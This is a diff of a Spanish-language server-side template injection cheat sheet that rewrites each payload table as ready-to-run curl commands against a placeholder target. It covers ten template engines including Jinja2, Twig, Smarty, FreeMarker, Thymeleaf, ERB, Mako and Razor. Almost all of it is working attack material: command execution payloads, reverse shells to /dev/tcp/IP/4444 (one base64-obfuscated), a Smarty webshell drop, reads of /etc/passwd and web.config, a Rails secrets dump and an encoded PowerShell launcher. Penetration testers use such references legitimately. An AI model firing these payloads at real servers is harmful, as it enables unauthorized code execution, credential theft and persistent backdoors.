@@ -23,18 +23,16 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `{{7*7}}` | `49` |
-| Confirm Flask context | `{{config}}` | Dump del Flask config object. |
-| Listar subclases | `{{ ''.__class__.__mro__[1].__subclasses__() }}` | Lista clases Python disponibles. |
-| Buscar subprocess.Popen | Index varies — buscar `<class 'subprocess.Popen'>` en lista | Index típico ~400. |
-| RCE via Popen index | `{{ ''.__class__.__mro__[1].__subclasses__()[<index>](['id'], stdout=-1).communicate() }}` | Reemplazar `<index>` con el correcto. |
-| RCE via os.popen (compacto) | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Sin enumerar subclases. |
-| RCE via config | `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` | Con sandbox parcial. |
-| RCE via request | `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Si `self` filtrado. |
-| RCE via lipsum (Flask) | `{{ lipsum.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Helper Flask siempre disponible. |
-| RCE via cycler (Jinja2) | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` | Helper Jinja2. |
-| Reverse shell | `{{ ''.__class__.__mro__[1].__subclasses__()[<index>](['bash','-c','bash -i >& /dev/tcp/IP/4444 0>&1']) }}` | Direct fork. |
-| File read | `{{ ''.__class__.__mro__[1].__subclasses__()[<index>]('/etc/passwd').read() }}` | Index de `<class '_io.TextIOWrapper'>`. |
+| `curl -G "https://target/page" --data-urlencode "q={{7*7}}"` | Output `49` confirma SSTI Jinja2/Twig | Detección inicial. |
+| `curl -G "https://target/page" --data-urlencode "q={{config}}"` | Dump del Flask config object | Confirmar context Flask. |
+| `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()}}"` | Lista clases Python disponibles | Pre-RCE — buscar index. |
+| `curl -G "https://target/page" --data-urlencode "q={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"` | RCE via os.popen + return output | Sandbox laxo. |
+| `curl -G "https://target/page" --data-urlencode "q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"` | RCE via config object | Si self filtrado. |
+| `curl -G "https://target/page" --data-urlencode "q={{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}"` | RCE via lipsum (Flask helper) | Lipsum siempre disponible Flask. |
+| `curl -G "https://target/page" --data-urlencode "q={{cycler.__init__.__globals__.os.popen('id').read()}}"` | RCE via cycler (Jinja2 helper) | Sandbox parcial. |
+| `curl -G "https://target/page" --data-urlencode "q={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"` | RCE via request | Si self / config filtrados. |
+| `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[<idx>](['bash','-c','bash -i >& /dev/tcp/IP/4444 0>&1'])}}"` | Reverse shell via Popen subclass | Index varies — enumerar primero. |
+| `curl -G "https://target/page" --data-urlencode "q={{''.__class__.__mro__[1].__subclasses__()[<idx>]('/etc/passwd').read()}}"` | File read via TextIOWrapper subclass | LFI. |
 ^ssti-engine-jinja2
 
 ___
@@ -43,17 +41,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `{{7*'7'}}` | `7777777` (string multiplication confirma Twig vs Jinja2). |
-| Twig 1.x RCE | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` | Vector clásico. |
-| Twig 2.x sandbox bypass | `{{['id']\|filter('system')}}` | Filter abuse. |
-| Twig 3.x — buscar new gadget | Generalmente sandbox más estricto. | Combinar con CVE específicos. |
-| Symfony 4.x RCE | `{{['id']\|map('system')\|join(',')}}` | Map filter abuse. |
-| Symfony — getEnv | `{{app.request.server.get('HTTP_HOST')}}` | Disclosure server config. |
-| Symfony — get session | `{{app.session}}` | Dump session data. |
-| Symfony — DB | `{{app.entity.manager.connection.executeQuery('SHOW TABLES')}}` | Si entity manager expuesto. |
-| RCE via filter chain | `{{["id",""]\|sort("system")}}` | Sort callback. |
-| RCE via filter raw | `{{['id']\|filter('passthru')}}` | passthru output directo. |
-| Get template source | `{{_self.env.getTemplateSource("file.twig")}}` | File read. |
+| `curl -G "https://target/page" --data-urlencode "q={{7*'7'}}"` | Output `7777777` (string mult) — Twig vs Jinja2 (49) | Detección differential. |
+| `curl -G "https://target/page" --data-urlencode "q={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"` | RCE Twig 1.x clásico | Pre-Twig 2.x. |
+| `curl -G "https://target/page" --data-urlencode "q={{['id']\|filter('system')}}"` | RCE Twig 2.x sandbox bypass via filter callback | Sandbox extension habilitada. |
+| `curl -G "https://target/page" --data-urlencode "q={{['id',''] \|sort('system')}}"` | RCE via sort callback | Sort filter accept callable. |
+| `curl -G "https://target/page" --data-urlencode "q={{['id']\|map('passthru')\|join('')}}"` | RCE via map filter | Map callback. |
+| `curl -G "https://target/page" --data-urlencode "q={{['id']\|filter('passthru')}}"` | RCE direct passthru output | passthru function. |
+| `curl -G "https://target/page" --data-urlencode "q={{app.request.server.get('HTTP_HOST')}}"` | Server config disclosure (Symfony) | Symfony stack. |
+| `curl -G "https://target/page" --data-urlencode "q={{app.session}}"` | Dump session data | Symfony app context. |
+| `curl -G "https://target/page" --data-urlencode "q={{_self.env.getTemplateSource('file.twig')}}"` | Template source disclosure | Twig env access. |
 ^ssti-engine-twig
 
 ___
@@ -62,16 +58,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `{7*7}` | `49` (delimitador `{` simple). |
-| Smarty v2 RCE directo | `{system('id')}` | Función PHP directa. |
-| Smarty v2 PHP | `{php}echo \`id\`;{/php}` | Bloque PHP raw. |
-| Smarty v3 RCE Internal_Write_File | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?=`$_GET[c]`?>",self::clearConfig())}` | Smarty 3 webshell drop. |
-| Smarty v3 self_template | `{self::getStreamVariable("file:///etc/passwd")}` | File read. |
-| Smarty `{if}` con func | `{if system('id')}{/if}` | Branch eval. |
-| Smarty math function | `{math equation="7*7"}` | Confirmar inyección. |
-| Disable security | `{php}eval($_GET[c]);{/php}` | Si Smarty con `php_handling=PHP_PASSTHRU`. |
-| Bypass `{php}` block disable | Usar `{Smarty_Internal_*}` static | Smarty 3 fallback. |
-| Webshell via include | `{include file="data:text/plain,{php}system('id'){/php}"}` | Stream wrappers PHP. |
+| `curl -G "https://target/page" --data-urlencode "q={7*7}"` | Output `49` (delimitador `{` simple) | Detección Smarty. |
+| `curl -G "https://target/page" --data-urlencode "q={system('id')}"` | RCE direct PHP function call | Smarty v2 / `php_handling=PHP_PASSTHRU`. |
+| `curl -G "https://target/page" --data-urlencode "q={php}echo \`id\`;{/php}"` | RCE bloque PHP raw | Smarty v2 con php block enabled. |
+| `curl -G "https://target/page" --data-urlencode "q={Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,'<?=\`\$_GET[c]\`?>',self::clearConfig())}"` | Webshell drop via static | Smarty v3 `{php}` deshabilitado. |
+| `curl -G "https://target/page" --data-urlencode "q={self::getStreamVariable('file:///etc/passwd')}"` | LFI via stream variable | Smarty 3 file read. |
+| `curl -G "https://target/page" --data-urlencode "q={if system('id')}{/if}"` | RCE en branch eval | `{if}` con función PHP. |
 ^ssti-engine-smarty
 
 ___
@@ -80,16 +72,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `${7*7}` | `49` |
-| RCE clásico Execute | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` | Default class disponible. |
-| RCE con ObjectConstructor | `${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["id"]).start()}` | Si Execute bloqueado. |
-| RCE con Runtime via Execute | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSAmJiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE=}|{base64,-d}|bash")}` | Reverse shell base64-encoded. |
-| File read | `<#include "/etc/passwd">` | Include directiva. |
-| File read alt | `<#assign value="freemarker.template.utility.Execute"?new()>${value("cat /etc/passwd")}` | Via Execute. |
-| RCE Spring | `<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}` | Spring + FreeMarker stack. |
-| Jython gadget | `${"java.lang.Runtime".getRuntime().exec("id")}` | Si reflection allowed. |
-| ?api gadget | `${object?api.class.protectionDomain.codeSource.location.toURI().resolve('/').path}` | Disclosure paths Spring. |
-| Hubspot CVE-2023-32692 | Específico — ver advisory | Apache FreeMarker 2.3.x. |
+| `curl -G "https://target/page" --data-urlencode "q=\${7*7}"` | Output `49` | Detección FreeMarker/Velocity/Mako/Thymeleaf. |
+| `curl -G "https://target/page" --data-urlencode "q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"` | RCE via Execute class | Default FreeMarker. |
+| `curl -G "https://target/page" --data-urlencode "q=\${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}"` | RCE via ObjectConstructor | Si Execute bloqueado. |
+| `curl -G "https://target/page" --data-urlencode "q=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"bash -c {echo,$(echo 'bash -i >& /dev/tcp/IP/4444 0>&1' \| base64 -w0)}|{base64,-d}|bash\")}"` | Reverse shell base64-encoded | Avoid escape issues. |
+| `curl -G "https://target/page" --data-urlencode "q=<#include \"/etc/passwd\">"` | File read via include | Include directiva. |
+| `curl -G "https://target/page" --data-urlencode "q=\${\"java.lang.Runtime\".getRuntime().exec(\"id\")}"` | RCE via reflection | Si reflection allowed. |
 ^ssti-engine-freemarker
 
 ___
@@ -98,13 +86,9 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `#set($x=7*7)$x` | `49` |
-| RCE clásico | `#set($e="exp") $e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Reflection chain. |
-| RCE compacto | `#set($s="")#set($stringClass=$s.getClass())#set($runtime=$stringClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))$runtime.exec("id")` | Más legible. |
-| File read | `#set($input=$s.getClass().forName("java.io.File").getConstructor($stringClass).newInstance("/etc/passwd"))` | Reflection clásica. |
-| Velocity 2.x security | Default mode = `secure` | Bypass requiere reflection avanzada. |
-| Confluence Velocity | `$render.eval(...)` específico | Atlassian gadgets. |
-| ContextTool gadget | `$cookie.set("XSS","<script>")` | Si tools.xml tiene CookieTool. |
+| `curl -G "https://target/page" --data-urlencode "q=#set(\$x=7*7)\$x"` | Output `49` | Detección Velocity. |
+| `curl -G "https://target/page" --data-urlencode "q=#set(\$s='')#set(\$stringClass=\$s.getClass())#set(\$runtime=\$stringClass.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null))\$runtime.exec('id')"` | RCE via reflection chain | Velocity 1.x. |
+| `curl -G "https://target/page" --data-urlencode "q=#set(\$file=\$s.getClass().forName('java.io.File').getConstructor(\$stringClass).newInstance('/etc/passwd'))"` | File constructor reflection | LFI. |
 ^ssti-engine-velocity
 
 ___
@@ -113,14 +97,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `${7*7}` o `[[${7*7}]]` | `49` solo en server-side context (`th:text`, `th:utext`). |
-| RCE via T() | `${T(java.lang.Runtime).getRuntime().exec('id')}` | SpringEL — funcional en `th:` attributes. |
-| RCE con Process read | `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}` | Output como string. |
-| Inline expression | `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` | Inline syntax. |
-| Selection expression | `*{T(java.lang.Runtime)...}` | Selection syntax. |
-| Spring Boot Actuator gadget | `${@org.springframework.boot.SpringApplication@exit(...)}` | Si Actuator expuesto. |
-| File read | `${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}` | Compose con StreamUtils. |
-| Escape expression preprocessor | `__${T(java.lang.Runtime)...}__::.x` | Bypass de algunos filtros. |
+| `curl -G "https://target/page" --data-urlencode "q=\${7*7}"` o `[[\${7*7}]]` | Output `49` | Detección Thymeleaf en server-side context. |
+| `curl -G "https://target/page" --data-urlencode "q=\${T(java.lang.Runtime).getRuntime().exec('id')}"` | RCE SpringEL via T() | Thymeleaf attribute context. |
+| `curl -G "https://target/page" --data-urlencode "q=[[\${T(java.lang.Runtime).getRuntime().exec('id')}]]"` | RCE inline syntax | Inline expression. |
+| `curl -G "https://target/page" --data-urlencode "q=\${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}"` | RCE + capture output | IOUtils para capturar stdout. |
+| `curl -G "https://target/page" --data-urlencode "q=\${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}"` | File read + capture | LFI con StreamUtils. |
+| `curl -G "https://target/page" --data-urlencode "q=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"` | Bypass filter via expression preprocessor | Filter naive. |
 ^ssti-engine-thymeleaf
 
 ___
@@ -129,17 +111,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `<%= 7*7 %>` | `49` |
-| RCE backtick | `<%= \`id\` %>` | Backtick = exec en Ruby. |
-| RCE system | `<%= system("id") %>` | Output a stdout (no captura — usar IO.popen). |
-| RCE IO.popen | `<%= IO.popen("id").read %>` | Captura stdout. |
-| RCE Open3 | `<%= Open3.capture3("id").first %>` | Stderr + stdout + status. |
-| File read | `<%= File.read("/etc/passwd") %>` | Direct File.read. |
-| Rails console gadget | `<%= ActiveRecord::Base.connection.execute("SELECT version()").first %>` | DB. |
-| Rails secret | `<%= Rails.application.secrets %>` | Disclosure secrets. |
-| Reverse shell | `<%= \`bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'\` %>` | Direct exec. |
-| ERB.new gadget | `ERB.new("<%= cmd %>").result` | Si app pasa input a ERB.new explícito. |
-| Liquid (Shopify) | `{{ "id" \| system_call }}` (custom filters) | Solo si filter custom inseguro. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= 7*7 %>"` | Output `49` | Detección ERB. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= \`id\` %>"` | RCE via backticks (Ruby exec) | Direct exec. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= IO.popen('id').read %>"` | RCE + capture stdout | IO.popen capture. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= system('id') %>"` | RCE (output a stdout, no captura) | Quick test. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= File.read('/etc/passwd') %>"` | File read | LFI. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= ActiveRecord::Base.connection.execute('SELECT version()').first %>"` | DB query (Rails console gadget) | Rails app. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= Rails.application.secrets %>"` | Rails secrets disclosure | Rails app. |
+| `curl -G "https://target/page" --data-urlencode "q=<%= \`bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'\` %>"` | Reverse shell | Direct exec backticks. |
 ^ssti-engine-erb
 
 ___
@@ -148,16 +127,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `${7*7}` | `49` |
-| RCE inline | `<%= os.popen('id').read() %>` | Bloque Python directo. |
-| RCE expression | `${os.popen('id').read()}` | Inline expression. |
-| Import + RCE | `<% import os %>${os.system('id')}` | Si import permitido. |
-| File read | `${open('/etc/passwd').read()}` | Direct. |
-| RCE compacto | `${self.module.cache.util.os.system('id')}` | Si self disponible. |
-| RCE via subprocess | `${__import__('subprocess').check_output('id', shell=True)}` | Built-in. |
-| Reverse shell | `${__import__('os').system('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"')}` | One-liner. |
-| Mako sandbox bypass | `${''.__class__.__mro__[2].__subclasses__()[40](...)}` | Subclass enumeration igual a Jinja2. |
-| Pyramid/Pylons stack | Default Mako | Frameworks Python clásicos. |
+| `curl -G "https://target/page" --data-urlencode "q=\${7*7}"` | Output `49` | Detección Mako. |
+| `curl -G "https://target/page" --data-urlencode "q=\${os.popen('id').read()}"` | RCE inline expression | os ya importado. |
+| `curl -G "https://target/page" --data-urlencode "q=<% import os %>\${os.system('id')}"` | RCE con import explícito | Sandbox laxo. |
+| `curl -G "https://target/page" --data-urlencode "q=\${__import__('subprocess').check_output('id', shell=True)}"` | RCE via subprocess | Build-in import. |
+| `curl -G "https://target/page" --data-urlencode "q=\${open('/etc/passwd').read()}"` | File read | LFI direct. |
+| `curl -G "https://target/page" --data-urlencode "q=\${self.module.cache.util.os.system('id')}"` | RCE via self chain | Si self disponible. |
+| `curl -G "https://target/page" --data-urlencode "q=\${__import__('os').system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')}"` | Reverse shell one-liner | Direct system. |
 ^ssti-engine-mako
 
 ___
@@ -166,12 +142,9 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `{{7*7}}` NO ejecuta | Handlebars es logic-less por default. |
-| RCE via require gadget | `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}` | Vector tradicional Handlebars (logic-less bypass). |
-| RCE via prototype pollution | Si app vulnerable a proto pollution + Handlebars | Combo. |
-| File read | Difícil sin require — gadget largo | Mismo vector RCE → leer archivo. |
-| Express + Handlebars | Backend común — Hapi.js, Express con hbs | Setup vulnerable típico. |
-| Mustache logic-less | Mismo concepto, generalmente NO RCE directo | Sandbox real más estricto. |
+| `curl -G "https://target/page" --data-urlencode "q={{7*7}}"` | NO ejecuta (logic-less) | Detección negativa Handlebars. |
+| Use Handlebars logic-less RCE gadget (require chain via lookup/sub.constructor) | RCE via require gadget | Stack Node.js + Handlebars. |
+| Test prototype pollution combo enviando `{"__proto__":{"isAdmin":true}}` | Combo PP + Handlebars | Stack JS vulnerable a ambos. |
 ^ssti-engine-handlebars
 
 ___
@@ -180,15 +153,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Detección | `@(7*7)` | `49` (Razor inline). |
-| Detección bloque | `@{int x = 7*7;}` + reflejado | Bloque code. |
-| RCE via System.Diagnostics | `@{System.Diagnostics.Process.Start("calc.exe");}` | Direct .NET. |
-| RCE con cmd.exe | `@{System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c id") { RedirectStandardOutput = true, UseShellExecute = false }).StandardOutput.ReadToEnd();}` | Captura stdout. |
-| Read file | `@System.IO.File.ReadAllText("C:\\inetpub\\wwwroot\\web.config")` | Disclosure config. |
-| Reverse shell PowerShell | `@{System.Diagnostics.Process.Start("powershell.exe","-enc <base64>");}` | Encoded payload. |
-| Razor Pages context | `@Model.Property` puede leak data | Si app pasa user-controlled a Razor literal. |
-| Blazor server-side | Mismo riesgo que Razor Pages | Modern stack. |
-| RazorEngine standalone | `@Model.Hack` | Lib usada para template emails. |
+| `curl -G "https://target/page" --data-urlencode "q=@(7*7)"` | Output `49` | Detección Razor. |
+| `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(\"calc.exe\");}"` | RCE direct .NET | Razor inline block. |
+| `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c id\"){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd();}"` | RCE + capture stdout | Comando con output. |
+| `curl -G "https://target/page" --data-urlencode "q=@System.IO.File.ReadAllText(\"C:\\inetpub\\wwwroot\\web.config\")"` | File read web.config | Disclosure config + machine keys. |
+| `curl -G "https://target/page" --data-urlencode "q=@{System.Diagnostics.Process.Start(\"powershell.exe\",\"-enc <base64>\");}"` | PowerShell encoded payload | Reverse shell encoded. |
 ^ssti-engine-razor
 
 ***
